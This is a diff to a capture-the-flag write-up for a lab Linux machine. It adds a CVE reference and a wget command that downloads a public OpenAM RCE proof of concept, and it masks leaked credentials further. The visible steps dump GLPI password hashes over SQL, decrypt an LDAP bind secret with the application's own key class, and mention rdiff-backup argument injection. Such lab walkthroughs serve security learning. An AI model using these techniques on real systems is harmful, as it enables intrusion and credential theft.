@@ -4,6 +4,7 @@
 
 ---
 
+
 ## Overview
 
 **Management** is a Linux machine that chains together several misconfigurations and poorly protected secrets:
@@ -116,7 +117,15 @@ During a more thorough review of the site, the following subdomain was found:
 https://sso.management.htb/openam/XUI/#login/
 ```
 
-This endpoint points to **OpenAM**, an SSO/Identity Management platform. The identified version was **16.0.5**, for which a known public exploit exists that allows remote command execution through a poorly protected password-reset endpoint (`PWResetUserValidation`).
+This endpoint points to **OpenAM**, an SSO/Identity Management platform. The identified version was **16.0.5**, which is affected by **[CVE-2026-33439](https://nvd.nist.gov/vuln/detail/CVE-2026-33439)** — a known public vulnerability that allows remote command execution through a poorly protected password-reset endpoint (`PWResetUserValidation`).
+
+A ready-made Python PoC for this CVE is publicly available:
+
+> **Exploit:** [CVE-2026-33439-Python-PoC](https://github.com/infernosalex/CVE-2026-33439-Python-PoC/blob/main/exploit.py)
+
+```bash
+wget https://raw.githubusercontent.com/infernosalex/CVE-2026-33439-Python-PoC/main/exploit.py
+```
 
 ### Confirming remote command execution
 
@@ -245,9 +254,9 @@ cat config_db.php
 ```php
 class DB extends DBmysql {
    public $dbhost = '127.0.0.1';
-   public $dbuser = 'g**i';
-   public $dbpassword = '8*********7';
-   public $dbdefault = 'g***db';
+   public $dbuser = '****';
+   public $dbpassword = '*************';
+   public $dbdefault = '*****';
    public $use_utf8mb4 = true;
    public $allow_datetime = false;
    public $allow_signed_keys = false;
@@ -259,7 +268,7 @@ The `glpicrypt.key` file was also found — GLPI's **internal encryption key**, 
 ### Connecting to the database
 
 ```bash
-mysql -h 127.0.0.1 -u g**i -p'8**********7' g****b
+mysql -h 127.0.0.1 -u **** -p'***********' *****
 ```
 
 ```sql
@@ -277,7 +286,7 @@ select * from glpi_authldaps;
 In this table, an encrypted value was found:
 
 ```text
-a******************************************************w==
+**********************************************************Pw==
 ```
 
 This is most likely the **bind password** of GLPI's LDAP configuration, encrypted with the `glpicrypt.key`.
@@ -292,9 +301,9 @@ select name, password from glpi_users;
  name        | password
 -------------+--------------------------------------------------------------
  glpi        | $2y$10$*****************************************************
- post-only   | $2y$10$2.$***************************************************
- tech        | $2y$10$$*****************************************************
- normal      | $2y$10$$*****************************************************
+ post-only   | $2y$10$2.***************************************************
+ tech        | $2y$10$*****************************************************
+ normal      | $2y$10$*****************************************************
  glpi-system |
 ```
 
@@ -335,7 +344,7 @@ define('GLPI_VAR_DIR', '/opt/glpi/files/');
 
 require_once('/opt/glpi/vendor/autoload.php');
 
-$encryptedValue = 'a$*****************************************************==';
+$encryptedValue = '*********************************************************Pw==';
 
 $key = new GLPIKey();
 $decrypted = $key->decrypt($encryptedValue);
@@ -350,7 +359,7 @@ php /tmp/decrypt.php
 **Result:**
 
 ```text
-Password: ***********
+Password: ********
 ```
 
 > **Why this works:** by defining the `GLPI_CONFIG_DIR` and `GLPI_VAR_DIR` constants and loading the application's own Composer autoloader (`vendor/autoload.php`), the script gets direct access to the `GLPIKey` class, which already knows automatically where to find the `glpicrypt.key` file and how to apply the correct decryption algorithm. It's an elegant way of "asking the application itself" to decrypt the secret, instead of having to reverse-engineer the algorithm (cipher, mode, key derivation) by hand.
@@ -485,6 +494,4 @@ cat /tmp/root_backup/root.txt
 - PHP + GLPI's own `GLPIKey` class — decrypting internal secrets
 - `ssh` — lateral access as `owen`
 - `rdiff-backup` — abusing argument injection for escalation to root
-
----
 
